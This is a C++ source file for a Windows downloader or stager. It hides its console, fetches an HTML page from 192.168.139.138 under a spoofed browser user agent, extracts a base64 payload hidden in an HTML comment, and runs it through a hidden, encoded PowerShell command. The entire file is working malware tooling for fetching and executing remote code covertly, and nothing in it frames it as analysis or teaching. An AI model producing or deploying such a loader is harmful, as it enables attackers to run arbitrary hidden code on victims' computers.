#include <windows.h>
#include <winhttp.h>
#include <string>
#include <algorithm>
#include <fstream>
#include <vector>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")

std::string DownloadHTML() {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return "";

    HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.139.138", 80, 0);
    if (!hConnect) { 
        WinHttpCloseHandle(hSession); 
        return ""; 
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/payload.html",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { 
        WinHttpCloseHandle(hConnect); 
        WinHttpCloseHandle(hSession); 
        return ""; 
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return "";
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return "";
    }

    std::string result;
    DWORD dwSize = 0;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        std::string buf(dwSize, '\0');
        DWORD dwRead = 0;
        if (WinHttpReadData(hRequest, &buf[0], dwSize, &dwRead))
            result.append(buf.c_str(), dwRead);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    
    return result;
}

std::string ExtractBase64(const std::string& html) {
    const std::string start = "<!-- PAYLOAD: ";
    const std::string end   = " -->";

    size_t s = html.find(start);
    if (s == std::string::npos) return "";
    s += start.length();

    size_t e = html.find(end, s);
    if (e == std::string::npos) return "";

    std::string raw = html.substr(s, e - s);
    std::string clean;
    for (char c : raw) {
        if (c != ' ' && c != '\t' && c != '\n' && c != '\r')
            clean += c;
    }
    
    return clean;
}

void RunPS(const std::string& b64) {
    std::wstring cmd = L"powershell.exe -nop -w hidden -enc " + 
                        std::wstring(b64.begin(), b64.end());

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CreateProcessW(NULL, const_cast<LPWSTR>(cmd.c_str()), NULL, NULL, FALSE,
                  CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
                  NULL, NULL, &si, &pi);

    if (pi.hThread)  CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    std::string html = DownloadHTML();
    if (html.empty()) return 1;

    std::string b64 = ExtractBase64(html);
    if (b64.empty()) return 1;

    RunPS(b64);
    return 0;
}